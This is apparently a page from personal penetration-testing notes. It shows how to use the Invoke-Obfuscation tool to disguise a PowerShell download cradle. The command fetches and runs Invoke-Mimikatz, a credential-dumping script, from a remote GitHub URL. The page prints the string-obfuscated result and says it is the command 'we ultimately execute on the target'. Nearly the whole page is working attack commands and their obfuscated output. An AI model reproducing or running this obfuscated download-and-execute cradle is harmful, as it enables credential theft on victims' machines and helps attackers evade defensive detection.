<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>method SET SCRIPTBLOCK: obfuscate a command</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>method SET SCRIPTBLOCK: obfuscate a command</h1><br /><br />1. command we want to obfuscate with
    “SET SCRIPTBLOCK”<br />
    <div class="codebox">
      <div class="codebox">
        Invoke-Obfuscation&gt;&nbsp;SET&nbsp;SCRIPTBLOCK&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&nbsp;&quot;);
      </div>
    </div><br />2. set an obfuscation method<br />
    <div class="codebox">
      <div class="codebox">
        Invoke-Obfuscation&gt;&nbsp;STRING&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#We&nbsp;have&nbsp;three&nbsp;options&nbsp;with&nbsp;the&nbsp;“STRING”&nbsp;obfuscation&nbsp;method<br />Invoke-Obfuscation&gt;&nbsp;STRING\3&nbsp;&nbsp;&nbsp;&nbsp;#If&nbsp;we&nbsp;want&nbsp;we&nbsp;can&nbsp;input&nbsp;directly&nbsp;this&nbsp;command
      </div>
    </div><br /> <a href=""><img src="images/1367-1.png" alt="images/1367-1.png" /></a><br />3. Export command on a
    file<br />
    <div class="codebox">
      <div class="codebox">Invoke-Obfuscation&gt;&nbsp;out</div>
    </div><br /> The result is the obfuscated command that we ultimately execute on the target:<br />
    <div class="codebox">
      <div class="codebox">
        SV&nbsp;&nbsp;(&#39;QI0&#39;+&#39;2&#39;)&nbsp;(&nbsp;[chAR[&nbsp;]]&quot;)&nbsp;)43]RaHC[&nbsp;f-)&#39;)}0{&nbsp;&#39;+&#39;1sp.ztakimiM-e&#39;+&#39;kovnI/slaitnederc&#39;+&#39;/ecruo&#39;+&#39;s_eludom/atad/rets&#39;+&#39;a&#39;+&#39;m/er&#39;+&#39;i&#39;+&#39;p&#39;+&#39;mE&#39;+&#39;/YTI&#39;+&#39;RUCES-CB/moc.t&#39;+&#39;n&#39;+&#39;etnocres&#39;+&#39;ubuh&#39;+&#39;tig.&#39;+&#39;war&#39;+&#39;//:spt&#39;+&#39;th}0&#39;+&#39;{(gnirt&#39;+&#39;Sdaoln&#39;+&#39;wo&#39;+&#39;D.)t&#39;+&#39;n&#39;+&#39;eilCbeW.te&#39;+&#39;N&nbsp;tcejbO-weN&#39;+&#39;(&#39;+&#39;X&#39;+&#39;EI&#39;((&nbsp;(&nbsp;)&#39;&#39;nIOJ-]2,11,3[emAn.)&#39;*RDM*&#39;&nbsp;Vg((&amp;&nbsp;&quot;&nbsp;&nbsp;);[arrAY]::REverSe(&nbsp;$QI02);&amp;&nbsp;((GET-vARiABlE&nbsp;&#39;*MDr*&#39;).NamE[3,11,2]-joiN&#39;&#39;)<span
          style="color:#000000;font-weight:400">(</span>&nbsp;[STRIng]::joIN(&#39;&#39;,$QI02&nbsp;)<span
          style="color:#000000;font-weight:400">)</span></div>
    </div><br />4. Clear previous encoding<br />
    <div class="codebox">
      <div class="codebox">Invoke-Obfuscation&gt;&nbsp;RESET</div>
    </div>
  </div>
</body>

</html>